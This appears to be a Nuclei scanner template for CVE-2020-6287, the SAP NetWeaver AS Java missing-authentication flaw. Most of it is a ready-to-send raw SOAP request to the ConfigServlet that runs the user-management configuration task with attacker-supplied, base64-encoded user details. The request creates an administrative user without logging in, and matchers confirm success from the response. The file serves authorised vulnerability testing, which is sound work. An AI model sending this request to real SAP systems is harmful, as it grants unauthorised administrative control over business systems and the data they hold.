cves/2020/CVE-2020-6287.yaml

id: CVE-2020-6287

info:
  name: Create an Administrative User in SAP NetWeaver AS JAVA (LM Configuration Wizard)
  author: dwisiswant0
  severity: critical
  tags: cve,cve2020,sap
  description: |
    SAP NetWeaver AS JAVA (LM Configuration Wizard), versions - 7.30, 7.31, 7.40, 7.50, does not perform an authentication check which allows an attacker without prior authentication to execute configuration tasks to perform critical actions against the SAP Java system, including the ability to create an administrative user, and therefore compromising Confidentiality, Integrity and Availability of the system, leading to Missing Authentication Check.
  reference:
    - https://launchpad.support.sap.com/#/notes/2934135
    - https://wiki.scn.sap.com/wiki/pages/viewpage.action?pageId=552599675
    - https://www.onapsis.com/recon-sap-cyber-security-vulnerability

requests:
  - payloads:
      data: helpers/payloads/CVE-2020-6287.xml
    raw:
      - |
        POST /CTCWebService/CTCWebServiceBean/ConfigServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=UTF-8
        Connection: close

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi"><soapenv:Header/><soapenv:Body><urn:executeSynchronious><identifier><component>sap.com/tc~lm~config~content</component><path>content/Netweaver/ASJava/NWA/SPC/SPC_UserManagement.cproc</path></identifier><contextMessages><baData>{{base64('§data§')}}</baData><name>userDetails</name></contextMessages></urn:executeSynchronious></soapenv:Body></soapenv:Envelope>
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "urn:CTCWebServiceSi"
        part: body
      - type: status
        status:
          - 200

      - type: word
        words:
          - "text/xml"
        part: header